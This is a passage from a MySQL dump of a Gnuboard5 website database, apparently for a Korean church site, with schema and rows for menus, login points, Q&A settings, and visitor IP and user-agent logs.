--
-- Dumping data for table `g5_menu`
--

LOCK TABLES `g5_menu` WRITE;
/*!40000 ALTER TABLE `g5_menu` DISABLE KEYS */;
INSERT INTO `g5_menu` VALUES (163,'10','소개','/bbs/content.php?co_id=intro','self',0,1,1),(164,'20','예배 자료','/bbs/board.php?bo_table=word_text','self',1,1,1),(165,'2010','문서 자료','/bbs/board.php?bo_table=word_text','self',0,1,1),(166,'2020','예배 말씀 - 영상(녹화)','/bbs/board.php?bo_table=word_rec','self',1,1,1),(167,'30','인터넷 선교','/bbs/board.php?bo_table=mission_01','self',2,1,1),(168,'40','강의','/bbs/board.php?bo_table=lecture_text','self',3,1,1),(169,'4010','동영상 성경강좌','/bbs/board.php?bo_table=lecture_real','self',1,1,1),(170,'4020','성경강좌 노트','/bbs/board.php?bo_table=lecture_text','self',0,1,1),(171,'50','기타참고 자료','/bbs/board.php?bo_table=ref_text','self',4,1,1),(172,'5010','참고 문서 자료','/bbs/board.php?bo_table=ref_text','self',0,1,1),(173,'5020','참고 영상 자료','/bbs/board.php?bo_table=ref_video','self',1,1,1),(174,'60','행사 자료','/bbs/board.php?bo_table=event_picture','self',5,1,1),(175,'6010','행사 사진 자료','/bbs/board.php?bo_table=event_picture','self',0,1,1),(176,'6020','행사 영상 자료','/bbs/board.php?bo_table=event_video','self',0,1,1);
/*!40000 ALTER TABLE `g5_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_new_win`
--

DROP TABLE IF EXISTS `g5_new_win`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_new_win` (
  `nw_id` int(11) NOT NULL AUTO_INCREMENT,
  `nw_device` varchar(10) NOT NULL DEFAULT 'both',
  `nw_begin_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `nw_end_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `nw_disable_hours` int(11) NOT NULL DEFAULT '0',
  `nw_left` int(11) NOT NULL DEFAULT '0',
  `nw_top` int(11) NOT NULL DEFAULT '0',
  `nw_height` int(11) NOT NULL DEFAULT '0',
  `nw_width` int(11) NOT NULL DEFAULT '0',
  `nw_subject` text NOT NULL,
  `nw_content` text NOT NULL,
  `nw_content_html` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`nw_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_new_win`
--

LOCK TABLES `g5_new_win` WRITE;
/*!40000 ALTER TABLE `g5_new_win` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_new_win` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_point`
--

DROP TABLE IF EXISTS `g5_point`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_point` (
  `po_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `po_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `po_content` varchar(255) NOT NULL DEFAULT '',
  `po_point` int(11) NOT NULL DEFAULT '0',
  `po_use_point` int(11) NOT NULL DEFAULT '0',
  `po_expired` tinyint(4) NOT NULL DEFAULT '0',
  `po_expire_date` date NOT NULL DEFAULT '0000-00-00',
  `po_mb_point` int(11) NOT NULL DEFAULT '0',
  `po_rel_table` varchar(20) NOT NULL DEFAULT '',
  `po_rel_id` varchar(20) NOT NULL DEFAULT '',
  `po_rel_action` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`po_id`),
  KEY `index1` (`mb_id`,`po_rel_table`,`po_rel_id`,`po_rel_action`),
  KEY `index2` (`po_expire_date`)
) ENGINE=MyISAM AUTO_INCREMENT=51 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_point`
--

LOCK TABLES `g5_point` WRITE;
/*!40000 ALTER TABLE `g5_point` DISABLE KEYS */;
INSERT INTO `g5_point` VALUES (1,'admin','2015-02-11 23:07:50','2015-02-11 첫로그인',100,0,0,'9999-12-31',100,'@login','admin','2015-02-11'),(2,'admin','2015-02-12 11:04:39','2015-02-12 첫로그인',100,0,0,'9999-12-31',200,'@login','admin','2015-02-12'),(3,'webmanager','2015-02-12 15:32:32','2015-02-12 첫로그인',100,0,0,'9999-12-31',100,'@login','webmanager','2015-02-12'),(4,'user01','2015-02-12 16:07:35','2015-02-12 첫로그인',100,0,0,'9999-12-31',100,'@login','user01','2015-02-12'),(5,'member01','2015-02-12 16:08:33','2015-02-12 첫로그인',100,0,0,'9999-12-31',100,'@login','member01','2015-02-12'),(6,'admin','2015-02-13 09:39:55','2015-02-13 첫로그인',100,0,0,'9999-12-31',300,'@login','admin','2015-02-13'),(7,'admin','2015-02-15 11:23:08','2015-02-15 첫로그인',100,0,0,'9999-12-31',400,'@login','admin','2015-02-15'),(8,'admin','2015-02-16 09:44:49','2015-02-16 첫로그인',100,0,0,'9999-12-31',500,'@login','admin','2015-02-16'),(9,'admin','2015-02-17 11:04:52','2015-02-17 첫로그인',100,0,0,'9999-12-31',600,'@login','admin','2015-02-17'),(10,'member01','2015-02-18 10:25:00','2015-02-18 첫로그인',100,0,0,'9999-12-31',200,'@login','member01','2015-02-18'),(11,'admin','2015-02-18 17:10:52','2015-02-18 첫로그인',100,0,0,'9999-12-31',700,'@login','admin','2015-02-18'),(12,'member01','2015-02-21 09:36:50','2015-02-21 첫로그인',100,0,0,'9999-12-31',300,'@login','member01','2015-02-21'),(13,'member01','2015-02-22 12:26:55','2015-02-22 첫로그인',100,0,0,'9999-12-31',400,'@login','member01','2015-02-22'),(14,'admin','2015-02-22 12:27:35','2015-02-22 첫로그인',100,0,0,'9999-12-31',800,'@login','admin','2015-02-22'),(15,'webmanager','2015-04-18 19:39:45','2015-04-18 첫로그인',100,0,0,'9999-12-31',200,'@login','webmanager','2015-04-18'),(16,'admin','2015-04-18 19:56:50','2015-04-18 첫로그인',100,0,0,'9999-12-31',900,'@login','admin','2015-04-18'),(17,'webmanager','2015-04-19 07:41:22','2015-04-19 첫로그인',100,0,0,'9999-12-31',300,'@login','webmanager','2015-04-19'),(18,'admin','2015-04-20 04:44:22','2015-04-20 첫로그인',100,0,0,'9999-12-31',1000,'@login','admin','2015-04-20'),(19,'webmanager','2015-04-20 04:50:42','2015-04-20 첫로그인',100,0,0,'9999-12-31',400,'@login','webmanager','2015-04-20'),(20,'admin','2015-04-21 07:35:34','2015-04-21 첫로그인',100,0,0,'9999-12-31',1100,'@login','admin','2015-04-21'),(21,'admin','2015-04-24 10:40:37','2015-04-24 첫로그인',100,0,0,'9999-12-31',1200,'@login','admin','2015-04-24'),(22,'webmanager','2015-04-26 12:52:16','2015-04-26 첫로그인',100,0,0,'9999-12-31',500,'@login','webmanager','2015-04-26'),(23,'webmanager','2015-04-29 21:40:53','2015-04-29 첫로그인',100,0,0,'9999-12-31',600,'@login','webmanager','2015-04-29'),(24,'webmanager','2015-05-01 17:31:05','2015-05-01 첫로그인',100,0,0,'9999-12-31',700,'@login','webmanager','2015-05-01'),(25,'webmanager','2015-05-04 16:33:29','2015-05-04 첫로그인',100,0,0,'9999-12-31',800,'@login','webmanager','2015-05-04'),(26,'webmanager','2015-05-05 21:33:13','2015-05-05 첫로그인',100,0,0,'9999-12-31',900,'@login','webmanager','2015-05-05'),(27,'webmanager','2015-05-06 14:32:01','2015-05-06 첫로그인',100,0,0,'9999-12-31',1000,'@login','webmanager','2015-05-06'),(28,'webmanager','2015-05-11 17:28:45','2015-05-11 첫로그인',100,0,0,'9999-12-31',1100,'@login','webmanager','2015-05-11'),(29,'webmanager','2015-05-12 13:12:43','2015-05-12 첫로그인',100,0,0,'9999-12-31',1200,'@login','webmanager','2015-05-12'),(30,'webmanager','2015-05-19 18:31:40','2015-05-19 첫로그인',100,0,0,'9999-12-31',1300,'@login','webmanager','2015-05-19'),(31,'admin','2015-05-21 04:58:25','2015-05-21 첫로그인',100,0,0,'9999-12-31',1300,'@login','admin','2015-05-21'),(32,'admin','2015-05-22 06:51:58','2015-05-22 첫로그인',100,0,0,'9999-12-31',1400,'@login','admin','2015-05-22'),(33,'webmanager','2015-05-25 13:46:18','2015-05-25 첫로그인',100,0,0,'9999-12-31',1400,'@login','webmanager','2015-05-25'),(34,'webmanager','2015-05-26 07:36:21','2015-05-26 첫로그인',100,0,0,'9999-12-31',1500,'@login','webmanager','2015-05-26'),(35,'admin','2015-05-26 07:38:03','2015-05-26 첫로그인',100,0,0,'9999-12-31',1500,'@login','admin','2015-05-26'),(36,'admin','2015-05-29 10:01:52','2015-05-29 첫로그인',100,0,0,'9999-12-31',1600,'@login','admin','2015-05-29'),(37,'charles','2015-06-03 17:02:30','회원가입 축하',1000,0,0,'9999-12-31',1000,'@member','charles','회원가입'),(38,'webmanager','2015-06-03 18:43:09','2015-06-03 첫로그인',100,0,0,'9999-12-31',1600,'@login','webmanager','2015-06-03'),(39,'webmanager','2015-06-11 20:48:15','2015-06-11 첫로그인',100,0,0,'9999-12-31',1700,'@login','webmanager','2015-06-11'),(40,'admin','2015-06-27 09:54:47','2015-06-27 첫로그인',100,0,0,'9999-12-31',1700,'@login','admin','2015-06-27'),(41,'webmanager','2015-07-07 10:34:46','2015-07-07 첫로그인',100,0,0,'9999-12-31',1800,'@login','webmanager','2015-07-07'),(42,'webmanager','2015-07-09 07:56:29','2015-07-09 첫로그인',100,0,0,'9999-12-31',1900,'@login','webmanager','2015-07-09'),(43,'admin','2015-07-09 12:23:59','2015-07-09 첫로그인',100,0,0,'9999-12-31',1800,'@login','admin','2015-07-09'),(44,'webmanager','2015-07-14 12:37:18','2015-07-14 첫로그인',100,0,0,'9999-12-31',2000,'@login','webmanager','2015-07-14'),(45,'admin','2015-07-14 12:37:50','2015-07-14 첫로그인',100,0,0,'9999-12-31',1900,'@login','admin','2015-07-14'),(46,'admin','2015-07-23 11:57:02','2015-07-23 첫로그인',100,0,0,'9999-12-31',2000,'@login','admin','2015-07-23'),(47,'admin','2015-08-25 22:21:58','2015-08-25 첫로그인',100,0,0,'9999-12-31',2100,'@login','admin','2015-08-25'),(48,'miclecho00','2015-08-26 06:22:01','회원가입 축하',1000,0,0,'9999-12-31',1000,'@member','miclecho00','회원가입'),(49,'admin','2015-08-29 00:26:15','2015-08-29 첫로그인',100,0,0,'9999-12-31',2200,'@login','admin','2015-08-29'),(50,'admin','2015-09-08 07:10:27','2015-09-08 첫로그인',100,0,0,'9999-12-31',2300,'@login','admin','2015-09-08');
/*!40000 ALTER TABLE `g5_point` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_poll`
--

DROP TABLE IF EXISTS `g5_poll`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_poll` (
  `po_id` int(11) NOT NULL AUTO_INCREMENT,
  `po_subject` varchar(255) NOT NULL DEFAULT '',
  `po_poll1` varchar(255) NOT NULL DEFAULT '',
  `po_poll2` varchar(255) NOT NULL DEFAULT '',
  `po_poll3` varchar(255) NOT NULL DEFAULT '',
  `po_poll4` varchar(255) NOT NULL DEFAULT '',
  `po_poll5` varchar(255) NOT NULL DEFAULT '',
  `po_poll6` varchar(255) NOT NULL DEFAULT '',
  `po_poll7` varchar(255) NOT NULL DEFAULT '',
  `po_poll8` varchar(255) NOT NULL DEFAULT '',
  `po_poll9` varchar(255) NOT NULL DEFAULT '',
  `po_cnt1` int(11) NOT NULL DEFAULT '0',
  `po_cnt2` int(11) NOT NULL DEFAULT '0',
  `po_cnt3` int(11) NOT NULL DEFAULT '0',
  `po_cnt4` int(11) NOT NULL DEFAULT '0',
  `po_cnt5` int(11) NOT NULL DEFAULT '0',
  `po_cnt6` int(11) NOT NULL DEFAULT '0',
  `po_cnt7` int(11) NOT NULL DEFAULT '0',
  `po_cnt8` int(11) NOT NULL DEFAULT '0',
  `po_cnt9` int(11) NOT NULL DEFAULT '0',
  `po_etc` varchar(255) NOT NULL DEFAULT '',
  `po_level` tinyint(4) NOT NULL DEFAULT '0',
  `po_point` int(11) NOT NULL DEFAULT '0',
  `po_date` date NOT NULL DEFAULT '0000-00-00',
  `po_ips` mediumtext NOT NULL,
  `mb_ids` text NOT NULL,
  PRIMARY KEY (`po_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_poll`
--

LOCK TABLES `g5_poll` WRITE;
/*!40000 ALTER TABLE `g5_poll` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_poll` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_poll_etc`
--

DROP TABLE IF EXISTS `g5_poll_etc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_poll_etc` (
  `pc_id` int(11) NOT NULL DEFAULT '0',
  `po_id` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `pc_name` varchar(255) NOT NULL DEFAULT '',
  `pc_idea` varchar(255) NOT NULL DEFAULT '',
  `pc_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`pc_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_poll_etc`
--

LOCK TABLES `g5_poll_etc` WRITE;
/*!40000 ALTER TABLE `g5_poll_etc` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_poll_etc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_popular`
--

DROP TABLE IF EXISTS `g5_popular`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_popular` (
  `pp_id` int(11) NOT NULL AUTO_INCREMENT,
  `pp_word` varchar(50) NOT NULL DEFAULT '',
  `pp_date` date NOT NULL DEFAULT '0000-00-00',
  `pp_ip` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`pp_id`),
  UNIQUE KEY `index1` (`pp_date`,`pp_word`,`pp_ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_popular`
--

LOCK TABLES `g5_popular` WRITE;
/*!40000 ALTER TABLE `g5_popular` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_popular` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_qa_config`
--

DROP TABLE IF EXISTS `g5_qa_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_qa_config` (
  `qa_title` varchar(255) NOT NULL DEFAULT '',
  `qa_category` varchar(255) NOT NULL DEFAULT '',
  `qa_skin` varchar(255) NOT NULL DEFAULT '',
  `qa_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `qa_use_email` tinyint(4) NOT NULL DEFAULT '0',
  `qa_req_email` tinyint(4) NOT NULL DEFAULT '0',
  `qa_use_hp` tinyint(4) NOT NULL DEFAULT '0',
  `qa_req_hp` tinyint(4) NOT NULL DEFAULT '0',
  `qa_use_sms` tinyint(4) NOT NULL DEFAULT '0',
  `qa_send_number` varchar(255) NOT NULL DEFAULT '0',
  `qa_admin_hp` varchar(255) NOT NULL DEFAULT '',
  `qa_admin_email` varchar(255) NOT NULL DEFAULT '',
  `qa_use_editor` tinyint(4) NOT NULL DEFAULT '0',
  `qa_subject_len` int(11) NOT NULL DEFAULT '0',
  `qa_mobile_subject_len` int(11) NOT NULL DEFAULT '0',
  `qa_page_rows` int(11) NOT NULL DEFAULT '0',
  `qa_mobile_page_rows` int(11) NOT NULL DEFAULT '0',
  `qa_image_width` int(11) NOT NULL DEFAULT '0',
  `qa_upload_size` int(11) NOT NULL DEFAULT '0',
  `qa_insert_content` text NOT NULL,
  `qa_include_head` varchar(255) NOT NULL DEFAULT '',
  `qa_include_tail` varchar(255) NOT NULL DEFAULT '',
  `qa_content_head` text NOT NULL,
  `qa_content_tail` text NOT NULL,
  `qa_mobile_content_head` text NOT NULL,
  `qa_mobile_content_tail` text NOT NULL,
  `qa_1_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_2_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_3_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_4_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_5_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_1` varchar(255) NOT NULL DEFAULT '',
  `qa_2` varchar(255) NOT NULL DEFAULT '',
  `qa_3` varchar(255) NOT NULL DEFAULT '',
  `qa_4` varchar(255) NOT NULL DEFAULT '',
  `qa_5` varchar(255) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_qa_config`
--

LOCK TABLES `g5_qa_config` WRITE;
/*!40000 ALTER TABLE `g5_qa_config` DISABLE KEYS */;
INSERT INTO `g5_qa_config` VALUES ('1:1문의','회원|포인트','basic','basic',1,0,1,0,0,'0','','',1,60,30,15,15,600,1048576,'','','','','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_qa_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_qa_content`
--

DROP TABLE IF EXISTS `g5_qa_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_qa_content` (
  `qa_id` int(11) NOT NULL AUTO_INCREMENT,
  `qa_num` int(11) NOT NULL DEFAULT '0',
  `qa_parent` int(11) NOT NULL DEFAULT '0',
  `qa_related` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `qa_name` varchar(255) NOT NULL DEFAULT '',
  `qa_email` varchar(255) NOT NULL DEFAULT '',
  `qa_hp` varchar(255) NOT NULL DEFAULT '',
  `qa_type` tinyint(4) NOT NULL DEFAULT '0',
  `qa_category` varchar(255) NOT NULL DEFAULT '',
  `qa_email_recv` tinyint(4) NOT NULL DEFAULT '0',
  `qa_sms_recv` tinyint(4) NOT NULL DEFAULT '0',
  `qa_html` tinyint(4) NOT NULL DEFAULT '0',
  `qa_subject` varchar(255) NOT NULL DEFAULT '',
  `qa_content` text NOT NULL,
  `qa_status` tinyint(4) NOT NULL DEFAULT '0',
  `qa_file1` varchar(255) NOT NULL DEFAULT '',
  `qa_source1` varchar(255) NOT NULL DEFAULT '',
  `qa_file2` varchar(255) NOT NULL DEFAULT '',
  `qa_source2` varchar(255) NOT NULL DEFAULT '',
  `qa_ip` varchar(255) NOT NULL DEFAULT '',
  `qa_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `qa_1` varchar(255) NOT NULL DEFAULT '',
  `qa_2` varchar(255) NOT NULL DEFAULT '',
  `qa_3` varchar(255) NOT NULL DEFAULT '',
  `qa_4` varchar(255) NOT NULL DEFAULT '',
  `qa_5` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`qa_id`),
  KEY `qa_num_parent` (`qa_num`,`qa_parent`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_qa_content`
--

LOCK TABLES `g5_qa_content` WRITE;
/*!40000 ALTER TABLE `g5_qa_content` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_qa_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_scrap`
--

DROP TABLE IF EXISTS `g5_scrap`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_scrap` (
  `ms_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` varchar(15) NOT NULL DEFAULT '',
  `ms_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`ms_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_scrap`
--

LOCK TABLES `g5_scrap` WRITE;
/*!40000 ALTER TABLE `g5_scrap` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_scrap` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_uniqid`
--

DROP TABLE IF EXISTS `g5_uniqid`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_uniqid` (
  `uq_id` bigint(20) unsigned NOT NULL,
  `uq_ip` varchar(255) NOT NULL,
  PRIMARY KEY (`uq_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_uniqid`
--

LOCK TABLES `g5_uniqid` WRITE;
/*!40000 ALTER TABLE `g5_uniqid` DISABLE KEYS */;
INSERT INTO `g5_uniqid` VALUES (15021215022195,'210.216.54.2'),(15021215023226,'210.216.54.2'),(15021215023900,'210.216.54.2'),(15021215025106,'210.216.54.2'),(15021215040461,'210.216.54.2'),(15021215094181,'210.216.54.2'),(15021215100801,'210.216.54.2'),(15021215111991,'210.216.54.2'),(15021216084757,'210.216.54.2'),(15021216092212,'210.216.54.2'),(15021216130421,'210.216.54.2'),(15021216205700,'210.216.54.2'),(15021216211698,'210.216.54.2'),(15021217120676,'210.216.54.2'),(15021217140421,'210.216.54.2'),(15021217152951,'210.216.54.2'),(15021217182404,'210.216.54.2'),(15021217185158,'210.216.54.2'),(15021217191889,'210.216.54.2'),(15021217193070,'210.216.54.2'),(15021217205642,'210.216.54.2'),(15021217212061,'210.216.54.2'),(15021217354925,'210.216.54.2'),(15021217464473,'210.216.54.2'),(15021217480423,'210.216.54.2'),(15021217483976,'210.216.54.2'),(15021217491631,'210.216.54.2'),(15021217513959,'210.216.54.2'),(15021217573608,'210.216.54.2'),(15021218421033,'210.216.54.2'),(15021218500013,'210.216.54.2'),(15021218500503,'210.216.54.2'),(15021218500796,'210.216.54.2'),(15021218502063,'210.216.54.2'),(15021219084921,'210.216.54.2'),(15021219090442,'210.216.54.2'),(15021219102463,'210.216.54.2'),(15021219251181,'210.216.54.2'),(15021219312564,'210.216.54.2'),(15021219330495,'210.216.54.2'),(15021219412491,'210.216.54.2'),(15021221222952,'210.216.54.2'),(15021223244642,'119.214.110.45'),(15021223391808,'119.214.110.45'),(15021309424831,'210.216.54.2'),(15021315262678,'112.216.179.210'),(15021316374094,'210.216.54.2'),(15021316381459,'210.216.54.2'),(15021318070488,'210.216.54.2'),(15021614533347,'210.216.54.2'),(15021614543543,'210.216.54.2'),(15021614551046,'210.216.54.2'),(15021615080639,'210.216.54.2'),(15021615124804,'210.216.54.2'),(15022219510009,'175.223.21.242'),(15042016480556,'210.216.54.2'),(15042021200249,'61.102.92.100'),(15042021225475,'61.102.92.100'),(15042021270483,'61.102.92.100'),(15042021325043,'61.102.92.100'),(15042021331441,'61.102.92.100'),(15042021375562,'61.102.92.100'),(15042021382495,'118.127.210.135'),(15050416334317,'118.37.92.209'),(15050417095291,'118.37.92.209'),(15050417122115,'118.37.92.209'),(15050521343306,'61.102.12.196'),(15050521343311,'61.102.12.196'),(15050521395366,'61.102.12.196'),(15050521441555,'61.102.12.196'),(15051213125537,'210.216.54.2'),(15052105002334,'112.221.70.74'),(15052105014243,'112.221.70.74'),(15052120060731,'61.102.92.100'),(15052120063112,'61.102.92.100'),(15052120132558,'61.102.92.100'),(15052206515847,'61.102.92.100'),(15052607440565,'210.216.54.2'),(15052613182887,'210.216.54.2'),(15052621240276,'61.102.92.100'),(15052621262541,'61.102.92.100'),(15052621264356,'61.102.92.100'),(15072314133545,'::1'),(15072314134768,'::1'),(15072314152294,'::1'),(15072314155518,'::1'),(15072314203784,'::1'),(15072314223726,'::1'),(15072314231138,'::1'),(15072314243928,'::1'),(15072314244298,'::1'),(15072314253473,'::1'),(15072314260379,'::1'),(15072314275194,'::1'),(15072314282962,'::1'),(15072314285432,'::1'),(15072314342256,'::1'),(15072314365246,'::1');
/*!40000 ALTER TABLE `g5_uniqid` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_visit`
--

DROP TABLE IF EXISTS `g5_visit`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_visit` (
  `vi_id` int(11) NOT NULL DEFAULT '0',
  `vi_ip` varchar(255) NOT NULL DEFAULT '',
  `vi_date` date NOT NULL DEFAULT '0000-00-00',
  `vi_time` time NOT NULL DEFAULT '00:00:00',
  `vi_referer` text NOT NULL,
  `vi_agent` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`vi_id`),
  UNIQUE KEY `index1` (`vi_ip`,`vi_date`),
  KEY `index2` (`vi_date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_visit`
--

LOCK TABLES `g5_visit` WRITE;
/*!40000 ALTER TABLE `g5_visit` DISABLE KEYS */;
INSERT INTO `g5_visit` VALUES (84,'60.21.137.114','2015-04-08','07:50:36','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(85,'1.161.56.44','2015-04-08','09:10:55','',''),(86,'189.85.18.26','2015-04-08','09:48:05','','curl/7.21.0 (x86_64-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6'),(87,'36.226.114.236','2015-04-08','14:42:08','',''),(88,'112.221.70.78','2015-04-08','21:00:20','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53'),(89,'::1','2015-04-08','21:39:02','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0'),(90,'61.240.144.64','2015-04-08','21:42:49','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(91,'36.226.112.184','2015-04-08','23:39:43','',''),(92,'169.54.233.121','2015-04-11','13:52:32','','Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'),(93,'54.153.2.23','2015-04-11','21:54:32','',''),(94,'1.164.46.191','2015-04-12','00:41:27','',''),(95,'36.226.118.31','2015-04-12','01:25:28','',''),(96,'60.21.137.114','2015-04-12','01:47:13','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(97,'1.163.64.232','2015-04-12','02:28:14','',''),(98,'203.195.204.80','2015-04-12','08:00:42','',''),(99,'112.64.25.166','2015-04-12','09:05:42','',''),(100,'112.221.70.78','2015-04-18','19:29:53','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(101,'211.36.147.244','2015-04-18','19:35:58','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(102,'::1','2015-04-18','19:38:52','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0'),(103,'60.21.137.114','2015-04-18','23:53:36','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(104,'118.165.129.49','2015-04-19','02:39:32','',''),(105,'1.161.20.76','2015-04-19','05:47:07','',''),(106,'62.210.136.203','2015-04-19','06:02:53','',''),(107,'188.138.17.205','2015-04-19','06:14:37','',''),(108,'95.173.190.6','2015-04-19','07:30:22','',''),(109,'182.118.54.29','2015-04-19','08:11:21','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(110,'182.118.53.171','2015-04-19','08:12:34','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(111,'1.169.95.84','2015-04-19','09:03:13','',''),(112,'79.124.90.208','2015-04-19','09:47:50','',''),(113,'60.21.137.114','2015-04-19','11:03:46','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(114,'61.240.144.67','2015-04-19','17:15:34','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(115,'95.173.190.4','2015-04-19','23:47:27','',''),(116,'111.251.50.215','2015-04-20','02:25:03','',''),(117,'::1','2015-04-20','04:43:46','http://localhost/','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0'),(118,'211.36.152.114','2015-04-20','04:50:42','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(119,'112.221.70.78','2015-04-20','04:59:29','http://112.221.70.76/?auto_login=1','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) 